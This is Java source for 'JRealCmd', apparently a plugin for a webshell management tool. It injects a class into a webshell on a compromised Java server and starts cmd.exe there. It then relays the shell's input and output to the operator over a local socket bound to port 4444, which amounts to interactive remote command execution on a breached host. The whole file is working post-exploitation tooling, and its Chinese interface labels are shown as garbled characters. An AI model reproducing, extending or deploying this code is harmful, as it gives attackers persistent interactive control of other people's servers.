package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginnAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;

@PluginnAnnotation(
        payloadName = "JavaDynamicPayload",
        Name = "JRealCmd"
)
public class RealCmd implements Plugin {
    private static final String CLASS_NAME = "plugin.RealCmd";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea tipTextArea = new RTextArea();
    private final JButton StartButton = new JButton("Start");
    private final JButton StopButton = new JButton("Stop");
    private final JLabel hostLabel = new JLabel("�󶨱���Host :");
    private final JLabel portLabel = new JLabel("�󶨱���Port :");
    private final JLabel pollingSleepLabel = new JLabel("�ӳ�(ms)");
    private final JLabel execFileLabel = new JLabel("��ִ���ļ�·��");
    private final JTextField hostTextField = new JTextField("127.0.0.1", 15);
    private final JTextField portTextField = new JTextField("4444", 7);
    private final JTextField execFileTextField = new JTextField("cmd.exe", 30);
    private final JTextField pollingSleepTextField = new JTextField("1000", 7);
    private final JSplitPane meterpreterSplitPane = new JSplitPane();
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public RealCmd() {
        this.meterpreterSplitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.pollingSleepLabel);
        meterpreterTopPanel.add(this.pollingSleepTextField);
        meterpreterTopPanel.add(this.execFileLabel);
        meterpreterTopPanel.add(this.execFileTextField);
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.StartButton);
        meterpreterTopPanel.add(this.StopButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void StartButtonClick(ActionEvent actionEvent) {
        this.load();

        try {
            String host = this.hostTextField.getText().trim();
            String port = this.portTextField.getText().trim();
            ServerSocket serverSocket = new ServerSocket(Integer.parseInt(port), 1, InetAddress.getByName(host));
            new runCmd(serverSocket.accept(), this.payload, this.execFileTextField.getText().trim(), this.pollingSleepTextField);
            serverSocket.close();
        } catch (Exception var5) {
            Log.error(var5);
            JOptionPane.showMessageDialog(this.getView(), var5.getMessage(), "��ʾ", JOptionPane.WARNING_MESSAGE);
        }

    }

    private void StopButtonClick(ActionEvent actionEvent) {
        this.load();
        ReqParameter reqParameter = new ReqParameter();
        reqParameter.add("action", "stop");
        byte[] result = this.payload.evalFunc("plugin.RealCmd", "xxx", reqParameter);
        if (result.length != 1 || result[0] != 255 && result[0] != -1) {
            JOptionPane.showMessageDialog(this.getView(), "fail", "��ʾ", JOptionPane.WARNING_MESSAGE);
        } else {
            JOptionPane.showMessageDialog(this.getView(), "stop ok", "��ʾ", JOptionPane.INFORMATION_MESSAGE);
        }

    }

    private void load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/RealCmd.classs");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("plugin.RealCmd", data)) {
                    this.loadState = true;
                    Log.log("Load success");
                } else {
                    Log.log("Load fail");
                }
            } catch (Exception var3) {
                Log.error(var3);
            }
        }

    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
    }

    public JPanel getView() {
        return this.panel;
    }

    class runCmd {
        JTextField pollingSleepTextField;
        Socket socketx;

        public runCmd(Socket socket, Payload payload, String execFile, JTextField pollingSleepTextField) {
            try {
                this.socketx = socket;
                this.pollingSleepTextField = pollingSleepTextField;
                final OutputStream outputStream = socket.getOutputStream();
                final InputStream inputStream = socket.getInputStream();
                ReqParameter reqParameter = new ReqParameter();
                reqParameter.add("action", "start");
                reqParameter.add("execFile", execFile);
                byte[] result = payload.evalFunc("plugin.RealCmd", "xxx", reqParameter);
                outputStream.write(result);
                (new Thread(() -> runCmd.this.IO(inputStream))).start();
                Thread.sleep(5000L);
                (new Thread(() -> runCmd.this.LO(outputStream))).start();
            } catch (Exception var11) {
                Log.error(var11);

                try {
                    this.socketx.close();
                } catch (IOException var10) {
                    Log.error(var11);
                }
            }

        }

        public void IO(InputStream inputStream) {
            byte[] data = new byte[5120];

            int readNum;
            try {
                while ((readNum = inputStream.read(data)) != -1 && !this.socketx.isClosed()) {
                    ReqParameter reqParameter = new ReqParameter();
                    reqParameter.add("action", "processWriteData");
                    reqParameter.add("processWriteData", Arrays.copyOf(data, readNum));
                    byte[] result = RealCmd.this.payload.evalFunc("plugin.RealCmd", "xxx", reqParameter);
                    if (result.length == 1 && result[0] == -1) {
                        this.socketx.close();
                        return;
                    }
                }
            } catch (Exception var7) {
                try {
                    this.socketx.close();
                    return;
                } catch (IOException var6) {
                    Log.error(var7);
                }
            }

        }

        public void LO(OutputStream outputStream) {
            while (true) {
                try {
                    if (!this.socketx.isClosed()) {
                        int sleepTime = Integer.parseInt(this.pollingSleepTextField.getText().trim());
                        Thread.sleep(sleepTime > 500 ? sleepTime : 500);
                        ReqParameter reqParameter = new ReqParameter();
                        reqParameter.add("action", "getResult");
                        byte[] result = RealCmd.this.payload.evalFunc("plugin.RealCmd", "xxx", reqParameter);
                        if (result.length == 1 && result[0] == -1) {
                            this.socketx.close();
                            return;
                        }

                        if (result.length != 2 || result[0] != 45 || result[1] != 49) {
                            outputStream.write(result);
                        }
                        continue;
                    }
                } catch (Exception var6) {
                    try {
                        this.socketx.close();
                    } catch (IOException var5) {
                        Log.error(var6);
                    }
                }

                return;
            }
        }
    }
}
